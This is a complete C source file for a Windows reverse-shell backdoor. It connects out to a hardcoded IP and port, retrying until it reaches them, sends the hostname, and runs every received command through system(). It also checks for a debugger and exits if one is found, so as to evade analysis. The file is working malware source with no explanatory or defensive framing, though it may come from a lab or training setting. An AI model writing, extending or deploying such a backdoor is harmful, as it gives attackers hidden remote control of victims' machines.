#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdlib.h>  // For malloc() and free()
#pragma comment(lib, "ws2_32.lib")

int main() {
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa;
    char* commandBuffer;
    int recvResult;
    char hostname[512];

    const int port = 9000;
    const char ip_addr[] = "172.29.138.13";

    // Allocate command buffer on the heap
    commandBuffer = (char*)malloc(100000);
    if (commandBuffer == NULL) {
        printf("[-] Memory allocation failed\n");
        return EXIT_FAILURE;
    }

    // Check for debugger
    if (IsDebuggerPresent()) {
        printf("[!] Debugger present, exiting!\n");
        free(commandBuffer);
        return EXIT_FAILURE;
    }

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[-] WSAStartup Failed: %d\n", WSAGetLastError());
        free(commandBuffer);
        return EXIT_FAILURE;
    }

    // Create socket
    shell = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (shell == INVALID_SOCKET) {
        printf("[-] Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        free(commandBuffer);
        return EXIT_FAILURE;
    }

    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    
    // Connect to the server
    while (connect(shell, (struct sockaddr*)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) {
        Sleep(2000);
        
    }

    // Send hostname (similar to `whoami`)
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        send(shell, hostname, strlen(hostname), 0);
    }

    // Receive and execute commands in a loop
    while (1) {
        recvResult = recv(shell, commandBuffer, 99999, 0);
        if (recvResult <= 0) {
            printf("[-] Connection closed or error occurred\n");
            break;
        }

        commandBuffer[recvResult] = '\0';  // Null-terminate the string
 

        // Execute the command without capturing the output
        system(commandBuffer);
    }

    // Cleanup
    closesocket(shell);
    WSACleanup();
    free(commandBuffer);  // Free the allocated memory
    return EXIT_SUCCESS;
}
